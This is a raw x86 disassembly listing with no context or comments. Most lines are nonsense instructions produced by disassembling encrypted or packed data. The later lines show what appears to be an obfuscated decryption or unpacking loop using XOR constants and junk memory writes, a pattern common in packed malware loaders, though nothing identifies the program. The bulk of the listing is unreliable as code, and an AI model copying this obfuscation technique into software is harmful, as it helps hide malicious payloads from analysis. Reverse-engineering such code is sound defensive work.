  40613a:	jb     0x4060f5
  40613c:	mov    dl,0x41
  40613e:	in     eax,dx
  40613f:	or     eax,0x4ad4c076
  406144:	inc    edi
  406145:	cld    
  406146:	jle    0x40611f
  406148:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40614a:	nop
  40614b:	int    0x7c
  40614d:	leave  
  40614e:	xchg   ebp,eax
  40614f:	pop    edi
  406150:	mov    esi,0x5645291f
  406155:	push   DWORD PTR ds:[esi-0x2f6361aa]
  40615c:	jmp    0x23db1cb9
  406161:	pop    ss
  406162:	xchg   edx,eax
  406163:	je     0x4061c3
  406165:	(bad)  [edi]
  406167:	inc    eax
  406168:	push   esp
  406169:	ins    BYTE PTR es:[edi],dx
  40616a:	int3   
  40616b:	sbb    DWORD PTR fs:[ebx+0x1c4a2495],edi
  406172:	lds    ebp,FWORD PTR [ecx]
  406174:	repnz icebp 
  406176:	pop    ebx
  406177:	cwde   
  406178:	cmp    al,0xe0
  40617a:	test   al,0x89
  40617c:	mov    ebx,0x6ae9de08
  406181:	and    ebx,edi
  406183:	inc    ebp
  406184:	nop
  406185:	sub    BYTE PTR [eax+edi*2-0x2f17550f],ah
  40618c:	push   edi
  40618d:	xor    DWORD PTR [ebx-0x72],ebx
  406190:	cli    
  406191:	repnz addr16 sti 
  406194:	jb     0x406203
  406196:	or     eax,0xbee4aa73
  40619b:	sub    eax,0x1b7d5059
  4061a0:	xlat   BYTE PTR ds:[ebx]
  4061a1:	push   ebx
  4061a2:	enter  0x406a,0x6d
  4061a6:	cmp    BYTE PTR [ecx],al
  4061a8:	jnp    0x4061ea
  4061aa:	lahf   
  4061ab:	push   ds
  4061ac:	scas   eax,DWORD PTR es:[edi]
  4061ad:	adc    BYTE PTR [ebx+eiz*1-0x1421e795],0xf4
  4061b5:	dec    esi
  4061b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061b7:	push   0xdfcee1e5
  4061bc:	stos   DWORD PTR es:[edi],eax
  4061bd:	(bad)  
  4061be:	pop    ebx
  4061bf:	test   al,0xf2
  4061c1:	jp     0x406191
  4061c3:	and    al,0xef
  4061c5:	clc    
  4061c6:	mov    edi,0x68f80610
  4061cb:	and    eax,0x8c74ba20
  4061d0:	xchg   ecx,eax
  4061d2:	pop    esp
  4061d3:	fsubr  DWORD PTR [ebp+0x58]
  4061d6:	adc    eax,0xe129335
  4061db:	cwde   
  4061dc:	mov    WORD PTR [esi+ecx*8-0x4],?
  4061e0:	jg     0x40625c
  4061e2:	push   0xffffffeb
  4061e4:	add    DWORD PTR [esi+edx*4-0x5f24b85b],ebp
  4061eb:	pop    edx
  4061ec:	xchg   ebp,eax
  4061ed:	cs mov al,0x2f
  4061f0:	mov    dl,BYTE PTR [ecx+0x164fc193]
  4061f6:	mov    ds:0xaaba1a98,eax
  4061fb:	popf   
  4061fc:	mov    ds,WORD PTR [edi+0x9]
  4061ff:	mov    eax,ds:0xd5f6bf53
  406204:	gs imul dh
  406207:	mov    WORD PTR [edx],ss
  406209:	add    bh,BYTE PTR [ebp-0x5c]
  40620c:	test   DWORD PTR gs:[ebx+eax*8+0x616ecb53],ebp
  406214:	iret   
  406215:	xor    BYTE PTR [ebx-0x1505ce76],ah
  40621b:	mov    ch,0xc8
  40621d:	pushf  
  40621e:	hlt    
  40621f:	xchg   esp,eax
  406220:	test   BYTE PTR [esi+0x21],bl
  406223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406224:	sub    al,ch
  406226:	(bad)  
  406227:	dec    eax
  406228:	mov    ch,0x8d
  40622a:	fiadd  DWORD PTR [edi+ecx*8+0x4a]
  40622e:	or     DWORD PTR [ecx-0x50522349],esp
  406234:	arpl   WORD PTR [esi+0x5b],cx
  406237:	cdq    
  406238:	xlat   BYTE PTR ds:[ebx]
  406239:	add    al,BYTE PTR [eax+0x11]
  40623c:	push   ebp
  40623d:	mov    ebp,0x12e2190e
  406242:	jl     0x4061d2
  406244:	xchg   ebp,eax
  406245:	xor    bl,BYTE PTR [ecx]
  406247:	(bad)  
  406248:	dec    edx
  406249:	mov    DWORD PTR [edi-0x58],0x34624a96
  406250:	push   cs
  406251:	idiv   DWORD PTR [eax+0x6879f1d9]
  406257:	push   ebp
  406258:	arpl   WORD PTR [ebp+edi*1+0x444da487],di
  40625f:	ss jmp 0x880:0x536aede6
  406267:	mov    eax,ds:0xda08cad5
  40626c:	or     ah,BYTE PTR [ebx+ebx*2+0x63]
  406270:	push   edi
  406271:	aam    0x93
  406273:	inc    edi
  406274:	cmp    BYTE PTR [esi+0x2f416c03],ah
  40627a:	pop    ebp
  40627b:	aas    
  40627c:	and    edi,DWORD PTR [ecx]
  40627e:	and    DWORD PTR [ecx],esp
  406280:	or     BYTE PTR [edx+0xaaa9a2c],bl
  406286:	mov    al,ds:0xbac3c980
  40628b:	and    BYTE PTR [edi+0x4939f1e2],0x80
  406292:	push   cs
  406293:	fisub  DWORD PTR [eax]
  406295:	(bad)  
  406296:	sub    bl,BYTE PTR [eax+0x71ba6ff5]
  40629c:	out    dx,eax
  40629d:	std    
  40629e:	cmp    bh,bl
  4062a0:	cmp    edx,DWORD PTR [edi]
  4062a2:	mov    dl,0x49
  4062a4:	push   ecx
  4062a5:	push   esp
  4062a6:	imul   DWORD PTR ds:0xada211ca
  4062ac:	mov    ecx,DWORD PTR [ebx+0x48f7ce7f]
  4062b2:	adc    eax,0xcfa375d5
  4062b7:	adc    esi,edx
  4062b9:	sti    
  4062ba:	jae    0x4062f9
  4062bc:	fisubr DWORD PTR [eax+edx*2+0x2f2197a0]
  4062c3:	push   esp
  4062c4:	cmp    BYTE PTR gs:[ebx+0x65],cl
  4062c8:	dec    ecx
  4062c9:	sbb    eax,0x7b2c3ae1
  4062ce:	fstp   DWORD PTR [edi+0x59]
  4062d1:	and    edx,DWORD PTR [edi-0x61]
  4062d4:	mov    esp,0xf7625346
  4062d9:	cmp    ch,bl
  4062db:	or     eax,0x70c5694d
  4062e0:	dec    esp
  4062e1:	sbb    DWORD PTR [ebp+0x32],edi
  4062e4:	sub    eax,0x709a0ea8
  4062e9:	and    dh,al
  4062eb:	adc    DWORD PTR [eax],ebp
  4062ed:	jmp    0xf92e8f2d
  4062f2:	sbb    BYTE PTR [edi+0x6b766426],0xdd
  4062f9:	sbb    DWORD PTR [edi-0x5e97784c],ebx
  4062ff:	pop    esi
  406300:	hlt    
  406301:	fistp  DWORD PTR [esi]
  406303:	pop    edi
  406304:	inc    edx
  406305:	xchg   ecx,eax
  406306:	outs   dx,BYTE PTR ds:[esi]
  406307:	jle    0x40636c
  406309:	addr16 (bad) 
  40630b:	pop    ebp
  40630c:	mov    DWORD PTR [esi-0x67],ebx
  40630f:	cmp    BYTE PTR [esi],cl
  406311:	out    0x3d,eax
  406313:	jmp    0x94ad2fee
  406318:	mov    eax,0xbabcd9e2
  40631d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40631e:	mov    edx,0x68433bfc
  406323:	mov    es,WORD PTR [edx]
  406325:	mov    DWORD PTR [ebx+0x71],edi
  406328:	ret    0xce6
  40632b:	addr16 and eax,0x94c21ff8
  406331:	out    0xf,al
  406333:	std    
  406334:	pop    eax
  406335:	jle    0x40633d
  406337:	mov    ecx,0xd1924dd2
  40633c:	dec    ebx
  40633d:	mov    gs,WORD PTR [ebp+0x51]
  406340:	data16 (bad) [esi+0xe]
  406344:	dec    esi
  406345:	mov    ch,0xfd
  406347:	shl    BYTE PTR [ecx],0x38
  40634a:	nop
  40634b:	repnz (bad) 
  40634d:	iret   
  40634e:	jmp    0x2e11:0xf12bdf0f
  406355:	iret   
  406356:	mov    cl,ah
  406358:	ds inc esi
  40635a:	cmp    BYTE PTR [ecx+0xe2e7556],0xb6
  406361:	fmul   QWORD PTR [eax]
  406363:	arpl   bx,ax
  406365:	jae    0x40633e
  406367:	cmp    al,bl
  406369:	xor    ecx,DWORD PTR [edi]
  40636b:	sub    esp,DWORD PTR [esi-0x3284a322]
  406371:	gs rcl si,1
  406375:	int    0x74
  406377:	ror    BYTE PTR [ebp-0x47],0x6d
  40637b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40637c:	retf   0x53e1
  40637f:	xchg   esi,eax
  406380:	xchg   edx,eax
  406381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406382:	nop
  406383:	pop    esi
  406384:	scas   eax,DWORD PTR es:[edi]
  406385:	fidiv  WORD PTR [ecx+0x1b]
  406388:	lods   al,BYTE PTR ds:[esi]
  406389:	ins    DWORD PTR es:[edi],dx
  40638a:	xlat   BYTE PTR ds:[ebx]
  40638b:	fs adc edx,ebp
  40638e:	and    DWORD PTR [esi-0x19],esp
  406391:	jecxz  0x406346
  406393:	gs mov WORD PTR ss:[ecx],ss
  406397:	jl     0x406389
  406399:	jae    0x4063c6
  40639b:	sub    al,0x86
  40639d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40639e:	pop    edx
  40639f:	pop    ebp
  4063a0:	dec    edx
  4063a1:	dec    ecx
  4063a2:	xchg   bh,dh
  4063a4:	lods   al,BYTE PTR ds:[esi]
  4063a5:	add    eax,DWORD PTR [edx+0x3a5497a4]
  4063ab:	push   ds
  4063ac:	nop
  4063ad:	inc    eax
  4063ae:	add    eax,0x2f71db54
  4063b3:	sub    ch,BYTE PTR [edi-0x66d50581]
  4063b9:	adc    DWORD PTR [ebx],edi
  4063bb:	push   0x5e
  4063bd:	jno    0x4063f9
  4063bf:	call   0xa4708807
  4063c4:	outs   dx,DWORD PTR ds:[esi]
  4063c5:	jno    0x40637b
  4063c7:	push   ebp
  4063c8:	sahf   
  4063c9:	inc    BYTE PTR [ebx+0x72b73225]
  4063cf:	mov    ds:0xf831b27,al
  4063d4:	xchg   BYTE PTR [ebx],al
  4063d6:	add    BYTE PTR [eax],al
  4063d8:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4063de:	cld    
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	ins    BYTE PTR es:[edi],dx
  40645f:	add    DWORD PTR [ebx+0x7e38a5d1],ebx
  406465:	jle    0x40649a
  406467:	jge    0x4064e7
  406469:	jle    0x406495
  40646b:	sbb    eax,ebx
  40646d:	mov    cl,0x52
  40646f:	(bad)  
  406470:	out    0x65,al
  406472:	inc    ebx
  406473:	(bad)  
  406475:	mov    esi,0xf1a8cc79
  40647a:	dec    ebx
  40647b:	dec    esi
  40647c:	jmp    0x52e24945
  406481:	sub    ecx,eax
  406483:	mov    ecx,0xf5dd313b
  406488:	test   al,0xda
  40648a:	mov    al,ds:0x64dc7fad
  40648f:	push   eax
  406490:	xor    ch,BYTE PTR [edx+edi*8-0x560c80ec]
  406497:	mov    ah,0x9a
  406499:	xchg   ebp,eax
  40649a:	sub    BYTE PTR [esi-0x74],dl
  40649d:	jae    0x40651a
  40649f:	stos   BYTE PTR es:[edi],al
  4064a0:	and    DWORD PTR [ebx-0x2eb2fe97],0x1e
  4064a7:	jge    0x4064c7
  4064a9:	(bad)  
  4064aa:	cmp    al,0xd8
  4064ac:	xchg   ebx,eax
  4064ad:	enter  0x234f,0x6b
  4064b1:	les    edx,FWORD PTR [ecx+0x43]
  4064b4:	xchg   ebp,eax
  4064b5:	ret    
  4064b6:	xor    eax,0x469ff679
  4064bb:	into   
  4064bc:	cs hlt 
  4064be:	out    0xcd,eax
  4064c0:	push   0xffffff80
  4064c2:	xchg   esi,eax
  4064c3:	aas    
  4064c4:	cs loop 0x406515
  4064c7:	shl    esp,0x1c
  4064ca:	out    dx,al
  4064cb:	das    
  4064cc:	lock xor DWORD PTR [esi+0x2ee09234],edx
  4064d3:	ret    0xdc91
  4064d6:	xor    BYTE PTR [edx-0x8],dl
  4064d9:	push   edx
  4064da:	stc    
  4064db:	xchg   edi,eax
  4064dc:	pusha  
  4064dd:	outs   dx,BYTE PTR ds:[esi]
  4064de:	push   ebp
  4064df:	cmp    eax,0x9cb10719
  4064e4:	out    0xdf,al
  4064e6:	in     eax,0x29
  4064e8:	cs ins DWORD PTR es:[edi],dx
  4064ea:	call   0xe0292045
  4064ef:	push   es
  4064f0:	mov    bh,0xec
  4064f2:	std    
  4064f3:	int    0xac
  4064f5:	pop    es
  4064f6:	fucomp st(4)
  4064f8:	push   cs
  4064f9:	and    eax,0x95af7f91
  4064fe:	and    al,0x16
  406500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406501:	add    eax,0x44bbc581
  406506:	cmp    DWORD PTR [ebx-0x692fa855],ebp
  40650c:	cmp    dh,dl
  40650e:	cs sub al,0xd2
  406511:	sbb    DWORD PTR [edi+eax*8-0x2f2d9503],eax
  406518:	xor    al,0xf2
  40651a:	and    dh,bh
  40651c:	stc    
  40651d:	jmp    0x406509
  40651f:	dec    ebp
  406520:	push   ds
  406521:	xchg   esi,eax
  406522:	adc    BYTE PTR [edi+0xf],dl
  406525:	mov    al,0x1
  406527:	inc    edi
  406528:	(bad)  
  406529:	mov    ds:0xe156ac41,eax
  40652e:	sbb    DWORD PTR [edx+0xd],ebp
  406531:	fsub   DWORD PTR [ebp-0x22]
  406534:	pop    edi
  406535:	ins    DWORD PTR es:[edi],dx
  406536:	cmp    al,0x58
  406538:	push   edx
  406539:	fisttp QWORD PTR [ebx]
  40653b:	xor    BYTE PTR ds:0x3b2d1343,bh
  406541:	jg     0x40656a
  406543:	cli    
  406544:	pop    ebp
  406545:	push   ds
  406546:	mov    dh,0xbe
  406548:	push   eax
  406549:	scas   al,BYTE PTR es:[edi]
  40654a:	dec    ebx
  40654b:	mov    ebx,0xf76af09a
  406550:	pop    ebx
  406551:	xchg   esi,eax
  406552:	cs cli 
  406554:	pop    esp
  406555:	add    dh,BYTE PTR ds:[eax+0x30e86bda]
  40655c:	inc    ecx
  40655d:	jne    0x4064fd
  40655f:	imul   edx,DWORD PTR [eax-0x17],0x1b45d94b
  406566:	fild   DWORD PTR [ebp+0x3bb91d43]
  40656c:	cmp    BYTE PTR [ebx],bl
  40656e:	sbb    eax,0x537e9943
  406573:	sub    ebp,DWORD PTR [edi-0x4f]
  406576:	or     eax,DWORD PTR [ebx]
  406578:	inc    eax
  406579:	add    ch,BYTE PTR [ebx]
  40657b:	sbb    ebx,DWORD PTR [ebx+0x42]
  40657e:	fwait
  40657f:	rcr    al,1
  406581:	xor    eax,0x2178ac7c
  406586:	adc    BYTE PTR [eax-0x16b5615],al
  40658c:	sti    
  40658d:	jns    0x2fbfa922
  406593:	loop   0x4065bf
  406595:	ret    
  406596:	xchg   ebx,edx
  406598:	shl    dh,cl
  40659a:	(bad)  
  40659d:	and    DWORD PTR [edx-0x7ec9433a],ebx
  4065a3:	dec    ecx
  4065a4:	mov    ds:0x3f6e8574,eax
  4065a9:	test   eax,0x902523e4
  4065ae:	sbb    dh,bh
  4065b0:	test   eax,0xed4a1d19
  4065b5:	mov    al,0x7e
  4065b7:	ds push ebx
  4065b9:	cmc    
  4065ba:	dec    edi
  4065bb:	dec    edx
  4065bc:	add    esp,DWORD PTR [edi+0x371dbff0]
  4065c2:	test   al,0x25
  4065c4:	xor    dl,BYTE PTR [esi]
  4065c6:	mov    dh,0xc3
  4065c8:	pop    ds
  4065c9:	sub    edi,DWORD PTR [ebx-0x56]
  4065cc:	jne    0x406604
  4065ce:	dec    ebp
  4065cf:	adc    DWORD PTR [edi+0x60],ebx
  4065d2:	ss inc edi
  4065d4:	fs out dx,al
  4065d6:	and    DWORD PTR [ecx+0x2d],eax
  4065d9:	mov    ds:0x21674501,al
  4065de:	jge    0x4065af
  4065e0:	enter  0xbc46,0xb1
  4065e4:	arpl   WORD PTR [ebx-0x5d],bx
  4065e7:	das    
  4065e8:	xchg   ebp,eax
  4065e9:	mov    gs,WORD PTR [edi+0x3f8c703d]
  4065ef:	xchg   DWORD PTR [ebp-0x3da4feae],eax
  4065f5:	mul    BYTE PTR [ebx]
  4065f7:	test   DWORD PTR [esi-0xa3b4bd1],ebx
  4065fd:	sbb    DWORD PTR [ebx+0x2b],ebp
  406600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406601:	enter  0x9adf,0xa8
  406605:	jnp    0x4065ac
  406607:	mov    ebx,0x1a3c7889
  40660c:	mov    ch,0xf3
  40660e:	xor    esp,DWORD PTR [eax+0x4b]
  406611:	push   ss
  406612:	les    esp,FWORD PTR [esi-0x47]
  406615:	sbb    al,0x2c
  406617:	aaa    
  406618:	jb     0x406630
  40661a:	retf   
  40661b:	xor    al,0x2a
  40661d:	clc    
  40661e:	cmovle edx,DWORD PTR [eax+0x62f24bd7]
  406625:	shl    BYTE PTR [ecx-0x1c],1
  406628:	shl    BYTE PTR [esi],1
  40662a:	pop    ecx
  40662b:	mov    ?,WORD PTR [edi-0x42]
  40662e:	sbb    al,0xb1
  406630:	mov    eax,0x352767b6
  406635:	sahf   
  406636:	jo     0x40663b
  406638:	jge    0x40663f
  40663a:	dec    esp
  40663b:	jb     0x4065bf
  40663d:	xor    al,0xf9
  40663f:	adc    BYTE PTR [edx+0x3d],dh
  406642:	lods   al,BYTE PTR ds:[esi]
  406643:	adc    al,0x38
  406645:	rol    BYTE PTR [edx+0x37],cl
  406648:	inc    ecx
  406649:	daa    
  40664a:	aam    0x87
  40664c:	pop    eax
  40664d:	jns    0x4065d6
  40664f:	mov    ah,0x1e
  406651:	loope  0x406681
  406653:	sbb    ah,BYTE PTR [edx]
  406655:	fcom   st(2)
  406657:	cmp    al,0x38
  406659:	pop    ds
  40665a:	sahf   
  40665b:	sbb    al,0xc2
  40665d:	sub    ebp,edx
  40665f:	cmp    BYTE PTR [eax],bh
  406661:	int3   
  406662:	retf   0xc895
  406665:	hlt    
  406666:	mov    ch,0x3e
  406668:	push   esp
  406669:	or     ah,bh
  40666b:	cwde   
  40666c:	test   DWORD PTR [ebx+0x1051c0bc],esp
  406672:	mov    ?,edi
  406674:	ror    DWORD PTR [eax-0x7d],cl
  406677:	jb     0x4066a1
  406679:	je     0x406644
  40667b:	mov    al,ds:0xc85109a0
  406680:	cdq    
  406681:	js     0x40662d
  406683:	leave  
  406684:	mov    ah,0x52
  406686:	push   ebx
  406687:	push   es
  406688:	xchg   ch,ch
  40668a:	inc    ebp
  40668b:	mov    dh,BYTE PTR ds:0x87a2bf86
  406691:	jge    0x4066a5
  406693:	test   DWORD PTR [ebx+0x6f],esp
  406696:	int    0x9e
  406698:	jnp    0x4066d7
  40669a:	mov    eax,ds:0xdf8e625e
  40669f:	iret   
  4066a0:	bound  esi,QWORD PTR [eax]
  4066a2:	push   cs
  4066a3:	jne    0x406698
  4066a5:	(bad)  
  4066a6:	sub    eax,0xfb27285e
  4066ab:	aam    0xde
  4066ad:	adc    eax,0xc918d31e
  4066b2:	mov    ah,0xa1
  4066b4:	not    BYTE PTR [eax+0xd]
  4066b7:	pop    ds
  4066b8:	int3   
  4066b9:	mov    ecx,0xeba6a134
  4066be:	xchg   edx,eax
  4066bf:	jg     0x40670e
  4066c1:	inc    esp
  4066c2:	mov    eax,0xb8c231d1
  4066c7:	push   ds
  4066c8:	xor    bl,cl
  4066ca:	sbb    ecx,DWORD PTR [esi+0x7]
  4066cd:	fimul  DWORD PTR ds:[ecx-0x42669e60]
  4066d4:	sbb    DWORD PTR [edi],esp
  4066d6:	cs leave 
  4066d8:	pop    esi
  4066d9:	mov    edi,0x43dff3ca
  4066de:	sbb    dh,BYTE PTR [ebp+0x73]
  4066e1:	xor    ah,BYTE PTR [edx-0x32]
  4066e4:	popf   
  4066e5:	jle    0x4066b9
  4066e7:	xchg   ebx,eax
  4066e8:	and    BYTE PTR [ebx],dh
  4066ea:	inc    edi
  4066eb:	or     eax,DWORD PTR [esi]
  4066ed:	gs call 0x6eeaf46a
  4066f3:	sti    
  4066f4:	and    BYTE PTR [ebx+0x73b5ccb3],al
  4066fa:	xchg   ebx,eax
  4066fb:	push   ebx
  4066fc:	inc    ecx
  4066fd:	fcom   DWORD PTR [esi+0x45]
  406700:	push   es
  406701:	sub    DWORD PTR [edi],ecx
  406703:	retf   0x1f82
  406706:	mov    edx,DWORD PTR [edi]
  406708:	mov    edx,0xbfe52d0f
  40670d:	shr    BYTE PTR fs:[ecx],0x5f
  406711:	repz sub eax,0xbe68cb55
  406717:	inc    esi
  406718:	or     bh,BYTE PTR [eax-0x38]
  40671b:	pop    ss
  40671c:	pop    ss
  40671d:	jmp    0x406717
  40671f:	mov    dh,0x61
  406721:	add    al,0x22
  406723:	jl     0x4066af
  406725:	jbe    0x40672a
  406727:	xchg   BYTE PTR [edx+0x6b],ah
  40672a:	sub    al,BYTE PTR [ebx-0x61]
  40672d:	mov    ds:0xf91ef402,al
  406732:	xchg   edi,eax
  406733:	fst    QWORD PTR [edx+0x14]
  406736:	dec    eax
  406737:	sbb    cl,BYTE PTR [ebp-0x2df8a0a1]
  40673d:	ins    BYTE PTR es:[edi],dx
  40673e:	mov    ah,0xc2
  406740:	lods   al,BYTE PTR ds:[esi]
  406741:	inc    esi
  406742:	mul    DWORD PTR [ebp+0x26]
  406745:	stc    
  406746:	push   edx
  406747:	xchg   esi,eax
  406748:	add    DWORD PTR [edx],edx
  40674a:	sub    eax,0x60cc2c93
  40674f:	(bad)
  406753:	dec    ebx
  406754:	ret    
  406755:	pop    edi
  406756:	ins    DWORD PTR es:[edi],dx
  406757:	ret    0xa1af
  40675a:	fsubr  DWORD PTR [esi-0x5b1be3d]
  406760:	jl     0x40670f
  406762:	js     0x40678e
  406764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406765:	xchg   ebp,eax
  406766:	(bad)  
  406767:	dec    edx
  406768:	outs   dx,DWORD PTR ds:[esi]
  406769:	loopne 0x4067da
  40676b:	rol    DWORD PTR [esi],0x71
  40676e:	xchg   ecx,eax
  40676f:	add    DWORD PTR [edi-0x32],ebp
  406772:	mov    ecx,0x859f4c8f
  406777:	mul    BYTE PTR [esi]
  406779:	fisttp QWORD PTR [esi+0x24]
  40677c:	sti    
  40677d:	mov    cl,0x52
  40677f:	and    ebp,DWORD PTR [edi+0x62]
  406782:	pop    ebx
  406783:	cmp    edx,DWORD PTR [eax-0x2]
  406786:	sbb    eax,0x1faa5edc
  40678b:	(bad)  ds:0x24e1e79
  406791:	(bad)  
  406792:	cli    
  406793:	push   ss
  406794:	or     eax,0xd44cc360
  406799:	daa    
  40679a:	test   eax,0xba092f03
  40679f:	cld    
  4067a0:	pop    ds
  4067a1:	lods   eax,DWORD PTR ds:[esi]
  4067a2:	rol    BYTE PTR [esi],0x13
  4067a5:	fdiv   DWORD PTR [edi]
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
